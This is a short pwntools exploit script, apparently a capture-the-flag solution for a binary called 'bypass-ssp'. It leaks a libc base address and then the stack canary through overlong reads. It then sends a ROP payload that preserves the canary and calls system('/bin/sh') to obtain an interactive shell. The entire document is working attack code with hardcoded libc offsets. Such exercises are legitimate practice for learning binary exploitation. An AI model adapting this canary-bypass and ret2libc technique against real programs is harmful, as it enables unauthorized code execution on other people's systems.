from pwn import *

p = process('./bypass-ssp')

p.recvuntil(b': ')
p.send(b'a' * 0x18)

p.recvuntil(b'a' * 0x18)

libc = u64(p.recv(6)+b'\x00\x00') - 0x816e5
system = libc + 0x50d70
binsh = libc + 0x1d8678
pop_rdi = libc + 0x2a3e5
print(hex(libc))

p.recvuntil(b': ')
p.send(b'a' * 0x49)

p.recvuntil(b'a' * 0x48)
canary = u64(p.recv(8)) - ord('a')
print(hex(canary))

p.recvuntil(b': ')

pay = b'return' + b'a' * 0x42 + p64(canary) + b'a' * 8
pay += p64(pop_rdi) + p64(binsh) + p64(pop_rdi+1) + p64(system)
p.send(pay)

p.interactive()